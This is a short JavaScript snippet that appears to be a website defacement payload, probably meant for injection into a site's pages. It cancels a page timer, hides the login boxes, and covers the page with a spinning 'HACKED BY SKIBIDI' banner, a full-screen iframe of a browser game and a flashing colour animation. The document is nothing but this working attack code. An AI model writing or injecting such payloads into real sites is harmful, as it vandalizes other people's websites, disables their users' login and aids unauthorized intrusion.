if (typeof hacked === "undefined") {
    hacked = true;
    SetTimeCancel();
    HiddenObject('login_light_box');
    HiddenObject('m_login_light_box');
    HiddenObject('setTime');

    const h1 = document.createElement("h1");
    const iframe = document.createElement("iframe");
    const style = document.createElement("style");

    h1.innerText = "HACKED BY SKIBIDI";
    h1.style.cssText = "font-family: Arial; display: flex; justify-content: center; align-items: center; position: absolute; width: 100%; height: 100%; animation: rotate 1s linear infinite; pointer-events: none; z-index: 1;"

    iframe.src = "https://slither.io";
    iframe.style.cssText = "width: 100%; height: 100%; position: absolute;";

    style.innerHTML = `
body {
    /*animation: rotate 2s linear infinite*/
    /*animation: scale 10s linear infinite;*/
    animation: hue 0.5s linear infinite;
}

@keyframes rotate {
    100% { transform: rotate(360deg); }
}

@keyframes scale {
    100% { transform: scaleX(5) }
}

@keyframes hue {
    100% { filter: hue-rotate(360deg); }    
}
`.trim();

    document.body.appendChild(style);
    document.body.appendChild(h1);
    document.body.appendChild(iframe);
    // document.getElementById("main").appendChild(h1);
    // document.getElementById("main").appendChild(iframe);
}